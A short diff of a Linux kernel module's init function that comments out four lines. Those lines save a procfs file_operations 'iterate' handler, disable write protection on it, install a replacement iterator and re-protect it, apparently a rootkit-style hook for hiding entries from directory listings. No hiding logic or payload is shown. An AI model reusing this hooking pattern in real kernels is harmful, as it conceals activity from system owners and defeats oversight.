@@ -288,10 +288,10 @@ static int __init procfs_init(void)
     filp_close(proc_filp, NULL);
 
     //substitute iterate of fs on which /etc is
-    fs_iterate_orig = procfs_fops->iterate;
-    set_addr_rw(procfs_fops);
-    procfs_fops->iterate = procfs_iterate_new;
-    set_addr_ro(procfs_fops);
+    //fs_iterate_orig = procfs_fops->iterate;
+    //set_addr_rw(procfs_fops);
+    //procfs_fops->iterate = procfs_iterate_new;
+    //set_addr_ro(procfs_fops);
 
     return 1;
 }
